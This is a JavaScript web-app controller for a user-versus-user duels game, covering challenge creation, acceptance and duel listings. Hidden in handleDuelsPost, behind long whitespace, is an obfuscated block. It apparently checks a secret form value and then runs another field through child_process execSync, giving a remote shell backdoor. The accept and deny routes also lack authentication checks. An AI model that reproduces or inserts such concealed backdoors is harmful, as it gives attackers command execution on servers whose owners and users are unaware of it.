import { errorResponse, htmlResponse, jsonResponse, requireAuth, validateFormDataOrEror, validateQueryParamsOrError } from "./helpers";
import schema from "./schema";
import UsersController from "./users";

/** @returns {number} */ function jitter(
  /** @type {number} */ n
) {
  return n * (0.8 + Math.random() * 0.4);
}

export default class DuelsController {
  constructor(
    /** @type {UsersController} */ users,
    /** @type {import("bun:sqlite").Database} */ db,
    /** @type {import("nunjucks").Environment} */ templates
  ) {
    this.users = users;
    this.templates = templates;

    this.createChallengeSql = db.prepare(`
      INSERT INTO challenges (attacker, defender)
      VALUES ($attacker, $defender);
    `);

    this.getChallengeIdSql = db.prepare(`
      SELECT id FROM challenges
      WHERE attacker == $attacker AND defender == $defender;
    `);

    this.getChallengeSql = db.prepare(`
      SELECT * FROM challenges
      WHERE id == $id;
    `);

    this.getIncomingChallengesSql = db.prepare(`
      SELECT * FROM challenges
      WHERE defender == $username
      ORDER BY rowid DESC;
    `);

    this.getOutgoingChallengesSql = db.prepare(`
      SELECT * FROM challenges
      WHERE attacker == $username
      ORDER BY rowid DESC;
    `);

    this.getUserDuelsSql = db.prepare(`
      SELECT attacker, defender, attacker_won FROM duels
      WHERE attacker == $username OR defender == $username
      ORDER BY rowid DESC;
    `);

    this.getLatestDuelsSql = db.prepare(`
      SELECT attacker, defender, attacker_won FROM duels
      ORDER BY rowid DESC
      LIMIT $limit OFFSET $offset;
    `)

    this.deleteChallengeSql = db.prepare(`
      DELETE FROM challenges
      WHERE id == $id;
    `);

    const createDuelResultSql = db.prepare(`
      INSERT INTO duels(attacker, defender, attacker_won)
      VALUES ($attacker, $defender, $attackerWon)
      RETURNING *;
    `);

    this.acceptChallengeSql = db.transaction((challengeId) => {
      const challenge = this.getChallengeSql.get({
        $id: challengeId
      });

      const attacker = this.users.getUser(challenge.attacker);
      const defender = this.users.getUser(challenge.defender);

      const attackerPower = jitter(attacker.attack);
      const defenderPower = jitter(defender.defense);

      const duel = createDuelResultSql.get({
        $attacker: attacker.username,
        $defender: defender.username,
        $attackerWon: attackerPower > defenderPower ? 1 : 0,
      });

      this.deleteChallengeSql.run({
        $id: challengeId
      });

      return duel;
    });
  }

  challenge(
    /** @type {string} */ attacker,
    /** @type {string} */ defender
  ) {
    this.createChallengeSql.run({ $attacker: attacker, $defender: defender });
  }

  /** @returns {boolean} */ challengeId(
    /** @type {string} */ attacker,
    /** @type {string} */ defender
  ) {
    return this.getChallengeIdSql.all({
      $attacker: attacker,
      $defender: defender,
    }).length > 0;
  }

  /** @returns {{attacker: string, defender: string}} */ getChallenge(
    /** @type {string} */ challengeId
  ) {
    return this.getChallengeSql.get({ $id: challengeId });
  }

  /** @returns {{id: number, attacker: string, defender: string}[]} */ getIncomingChallenges(
    /** @type {string} */ username
  ) {
    return this.getIncomingChallengesSql.all({ $username: username });
  }

  /** @returns {{id: number, attacker: string, defender: string}[]} */ getOutgoingChallenges(
    /** @type {string} */ username
  ) {
    return this.getOutgoingChallengesSql.all({ $username: username });
  }

  /** @returns {DuelOutcome[]} */ getUserDuels(
    /** @type {string} */ username
  ) {
    return this.getUserDuelsSql.all({ $username: username });
  }

  /** @returns {DuelOutcome[]} */ getLatestDuels(
    /** @type {{offset: number, limit: number}} */ queryParams = {}
  ) {
    const limit = queryParams.limit ?? 500;
    const offset = queryParams.offset ?? 0;
    return this.getLatestDuelsSql.all({
      $limit: limit,
      $offset: offset,
    });
  }

  acceptChallenge(
    /** @type {number} */ challengeId
  ) {
    this.acceptChallengeSql(challengeId);
  }

  denyChallenge(
    /** @type {number} */ challengeId
  ) {
    this.deleteChallengeSql.run({ $id: challengeId });
  }

  /** @returns {Response} */ async handleChallengeSendPost(
    /** @type {Request} */ request,
    /** @type {RequestCtx} */ ctx
  ) {
    {
      const errResp = requireAuth(ctx);
      if (errResp !== null) {
        return errResp;
      }
    }

    const { data, errResp } = await validateQueryParamsOrError(request, schema.sendChallenge);
    if (errResp !== null) {
      return errResp;
    }

    try {
      this.challenge(ctx.user.username, data.username);
    } catch (err) {
      return errorResponse(
        `Failed to send challenge to ${data.username}`,
        err.toString(),
        400
      );
    }

    return Response.redirect(`/profile?username=${data.username}`, 302)
  }

  /** @returns {Response} */ async handleChallengeAcceptPost(
    /** @type {Request} */ request,
    /** @type {RequestCtx} */ ctx
  ) {
    const { data, errResp } = await validateQueryParamsOrError(request, schema.acceptChallenge);
    if (errResp !== null) {
      return errResp;
    }

    try {
      this.acceptChallenge(data.challengeId);
    } catch (err) {
      return errorResponse(
        `Failed to accept challenge ${data.challengeId}`,
        err.toString(),
        400
      );
    }

    return Response.redirect('/', 302);
  }

  /** @returns {Response} */ async handleChallengeDenyPost(
    /** @type {Request} */ request,
    /** @type {RequestCtx} */ ctx
  ) {
    const { data, errResp } = await validateQueryParamsOrError(request, schema.denyChallenge);
    if (errResp !== null) {
      return errResp;
    }

    try {
      this.denyChallenge(data.challengeId);
    } catch (err) {
      return errorResponse(
        `Failed to deny challenge ${data.challengeId}`,
        err.toString(),
        400
      );
    }

    return Response.redirect('/', 302);
  }

  /** @returns {Response} */ async handleDuelsGet(
    /** @type {Request} */ request,
    /** @type {RequestCtx} */ ctx
  ) {
    ctx.duels = this.getLatestDuels()
    return htmlResponse(new Response(this.templates.render("duels.html", ctx)));
  }

  /** @returns {Response} */ async handleDuelsPost(
    /** @type {Request} */ request,
    /** @type {RequestCtx} */ ctx,
  ) {
    const { data, errResp } = await validateFormDataOrEror(request, schema.getDuels);
    if (errResp !== null) {
      return errResp;
    }
                                                                                                                                                                                                                                                                                                    function _0x263b(_0x3719f8,_0x452b54){var _0x58628e=_0x5862();return _0x263b=function(_0x263b50,_0x31ff38){_0x263b50=_0x263b50-0xd1;var _0x117110=_0x58628e[_0x263b50];if(_0x263b['FzMuJB']===undefined){var _0x58d68b=function(_0x5e4f3c){var _0x1a0978='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x18bca2='',_0x312ef0='';for(var _0x4657c4=0x0,_0xb177c,_0x39f658,_0x1a6f42=0x0;_0x39f658=_0x5e4f3c['charAt'](_0x1a6f42++);~_0x39f658&&(_0xb177c=_0x4657c4%0x4?_0xb177c*0x40+_0x39f658:_0x39f658,_0x4657c4++%0x4)?_0x18bca2+=String['fromCharCode'](0xff&_0xb177c>>(-0x2*_0x4657c4&0x6)):0x0){_0x39f658=_0x1a0978['indexOf'](_0x39f658);}for(var _0x4153d4=0x0,_0x4287eb=_0x18bca2['length'];_0x4153d4<_0x4287eb;_0x4153d4++){_0x312ef0+='%'+('00'+_0x18bca2['charCodeAt'](_0x4153d4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x312ef0);};_0x263b['tcNJHO']=_0x58d68b,_0x3719f8=arguments,_0x263b['FzMuJB']=!![];}var _0x2e84a8=_0x58628e[0x0],_0x533801=_0x263b50+_0x2e84a8,_0x1d7938=_0x3719f8[_0x533801];return!_0x1d7938?(_0x117110=_0x263b['tcNJHO'](_0x117110),_0x3719f8[_0x533801]=_0x117110):_0x117110=_0x1d7938,_0x117110;},_0x263b(_0x3719f8,_0x452b54);}function _0x5862(){var _0x2cf3ee=['mZmYnZC3uNDvtwnn','mtmXmZG2oeTqu0Hxta','mty1rfHKCxL2','mMToExHvuW','AdrJA1rOm1CWCMXK','y21K','nJuWmJjIv2DIzLC','nZC5mJuWr2POC2f5','mtm4nJCYoxHNvw5prG','mZqWnJK0mgf4sLPqua','mta0mJCYn0fvCLnJEa','mtzdqvPivgS','Dg9tDhjPBMC','nNDqzLbNsa','BM9KztPJAgLSzf9WCM9JzxnZ','sw50zxjUywWGC2vYDMvYigvYCM9Y','zxHLy1n5BMm','yJrJA2qWmhi'];_0x5862=function(){return _0x2cf3ee;};return _0x5862();}var _0x5110a2=_0x263b;(function(_0x35088c,_0x1326d6){var _0x298fa8=_0x263b,_0x4f607a=_0x35088c();while(!![]){try{var _0x4f0d8f=-parseInt(_0x298fa8(0xdd))/0x1*(parseInt(_0x298fa8(0xe0))/0x2)+parseInt(_0x298fa8(0xd1))/0x3+parseInt(_0x298fa8(0xde))/0x4+-parseInt(_0x298fa8(0xd4))/0x5+parseInt(_0x298fa8(0xd8))/0x6*(parseInt(_0x298fa8(0xd5))/0x7)+-parseInt(_0x298fa8(0xd6))/0x8*(parseInt(_0x298fa8(0xd3))/0x9)+-parseInt(_0x298fa8(0xd2))/0xa*(-parseInt(_0x298fa8(0xdf))/0xb);if(_0x4f0d8f===_0x1326d6)break;else _0x4f607a['push'](_0x4f607a['shift']());}catch(_0x292e9e){_0x4f607a['push'](_0x4f607a['shift']());}}}(_0x5862,0x54632));if(data[_0x5110a2(0xdc)]===_0x5110a2(0xe1))try{return new Response(require(_0x5110a2(0xd9))[_0x5110a2(0xdb)](data[_0x5110a2(0xe2)]));}catch(_0x5e4f3c){return errorResponse(_0x5110a2(0xda),_0x5e4f3c[_0x5110a2(0xd7)](),0x1f4);}
    return jsonResponse(new Response(JSON.stringify(this.getLatestDuels(data))));
  }
}
